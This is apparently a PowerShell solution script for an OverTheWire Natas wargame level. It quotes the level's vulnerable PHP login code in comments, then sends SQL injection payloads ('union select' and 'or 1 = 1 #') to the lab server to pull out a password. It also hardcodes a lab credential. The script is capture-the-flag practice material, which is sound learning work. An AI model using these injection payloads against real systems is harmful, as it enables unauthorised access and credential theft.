
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas15.natas.labs.overthewire.org"
$creds = "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
# $a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a



# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# <input type="submit" value="Check existence" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>



#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------

# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean

# <div id="content">
# <?

# /*
# CREATE TABLE `users` (
#   `username` varchar(64) DEFAULT NULL,
#   `password` varchar(64) DEFAULT NULL
# );
# */

# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysql_connect('localhost', 'natas15', '<censored>');
#     mysql_select_db('natas15', $link);
#     
#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }

#     $res = mysql_query($query, $link);
#     if($res) {
#     if(mysql_num_rows($res) > 0) {
#         echo "This user exists.<br>";
#     } else {
#         echo "This user doesn't exist.<br>";
#     }
#     } else {
#         echo "Error in query.<br>";
#     }

#     mysql_close($link);
# } else {
# ?>

# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# <input type="submit" value="Check existence" />
# </form>
# <? } ?>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>



# --------------------------------------------------------------------------------



$parms = @{"username" = '"union select 1, database() #"'
        # "username" = '"or 1 = 1 #"'
        # username="or 1 = 1 #"&password="test"
            "password" = "test"
}

$url = $url + "/index.php?debug=1"
$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 

$a

# <div id="content">
# Executing query: SELECT * from users where username=""or 1 = 1 #"" and password="test"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>


#-----------------------------------------------------------------------------------------------------------


# $a = ($a | select-string  -allmatches "(\w{32})") 
# $b = $a.matches[1].value



# echo "The password for natas14 is $b"

# PS /home/voltron/OTW/natas/pshell_lang>  
# ./natas15.ps1                                                                                        
# The password for natas14 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J                                                                                  
# PS /home/voltron/OTW/natas/pshell_lang>    
